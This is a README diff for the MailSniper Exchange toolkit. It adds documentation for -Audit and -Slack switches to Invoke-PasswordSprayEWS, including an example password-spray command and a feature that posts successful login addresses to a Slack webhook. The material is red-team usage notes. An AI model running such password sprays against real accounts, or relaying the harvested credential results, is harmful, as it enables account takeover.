@@ -11,6 +11,28 @@ For more information about additional MailSniper modules check out these blog po
 
 - [Invoke-OpenInboxFinder](http://www.blackhillsinfosec.com/?p=5871)
 
+
+## Custom Additions
+```Invoke-PasswordSprayEWS -Audit and -Slack switches
+
+-Audit will print out failures AND successes instead of just successes
+-Slack will take the "XYZ" part of a slack webhook URL https://hooks.slack.com/services/XXXXXXXXX/YYYYYYYYYYY/ZZZZZZZZZ and send the following information to Slack:
+	
+	Message 1:	Spray Source IP Address: {{IP ADDRESS}}
+				Spray Started at: {{Start Time [Easter Standard Time]}}
+
+	Message 2:	Email address only for successful logins
+
+	Messsage 3:	Spray Completed at: {{Complete Time [Easter Standard Time]}}
+				Total Valid Creds: XXX
+
+Example of new command:
+	Invoke-PasswordSprayEWS -ExchHostname {{exchange URL}} -UserList emails.txt -Password asdf1234 -Audit -Slack XXXXXXXXXX/YYYYYYYYYYY/ZZZZZZZZZZ
+```
+
+
+
+
 Download the [MailSniper Field Manual](http://www.dafthack.com/files/MailSniper-Field-Manual.pdf) to quickly reference various MailSniper functions.
 
 ## Quick Start Guide
